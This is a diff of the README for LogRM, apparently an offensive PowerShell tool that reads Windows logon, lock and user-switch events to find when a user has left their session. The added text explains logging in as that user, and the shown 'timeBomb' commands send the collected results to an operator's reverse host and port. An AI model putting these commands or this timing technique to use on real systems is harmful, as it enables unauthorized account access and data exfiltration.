@@ -32,7 +32,7 @@ Use can use the following event types:
 9) Information EventID (4776) - The domain controller attempted to validate the credentials for an account
 
 
-### Examples
+### Scenarios
 
 The LogRM searching into newest 10(default value) entries into all event types.
 
@@ -117,12 +117,12 @@ PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server i
 PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-#### Example 1 - User is logged of -> Login (easy)
+#### Scenario 1 - User is logged of -> Login (easy)
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/user_is_loggedOf.png)
 
 
-#### Example 2 - Screen saver is invoked -> Login (easy)
+#### Scenario 2 - Screen saver is invoked -> Login (easy)
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/scrren_saver_is_invoked.png)
 
@@ -131,12 +131,18 @@ PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <P
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/scrren_saver_is_invoked2.png)
 
-#### Example 3 - Switch between users -> Login (medium)
+#### Scenario 3 - Switch between users -> Login (medium)
 
 In this scenario the user does not log of nor lock out from his account but instead of this uses "switch" between different accounts. The script will inform us that user's workstation is locked but this doesn't mean in all cases as you will see later that the user is not inside. To accomplish a successful login we have to observe the time of user's disconnection.
 
 ![alt_text](https://github.com/tasox/LogRM/blob/master/switch_between_users.png)
 
+
+From the screenshot above we can understand that the user hackme\tas disconnected from his terminal and connected to hackme\administrator. As a result of this movement the user now is not currently connected to his terminal and we can login as user hackme\tas.
+
+There is cases where it's very difficult to understand if any user is currently logged in. What if the user uses two times or more the switch button? As we said switch is a different event, is not logof (4647) is not lockout(4800/4801/4802/4803) but it is the event (4778/4779)
+
+#### 
 
 The task is going to run once at specific time.
 ```
@@ -144,7 +150,7 @@ PS> timeBomb -task once -at 15:00 -newest <give a big number> -reverseHost <Pyth
 PS> timeBomb -task once -at 15:00 -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-#### Example 1 - User is logged of
+#### Scenario 1 - User is logged of
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/timBomb_task_once.png)
 
@@ -172,7 +178,7 @@ PS> RDPConn
 PS> RDPConn -ip 127.0.0.1
 ```
 
-#### Example 1
+#### Scenario 1
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/RDP_winrm.png)
 
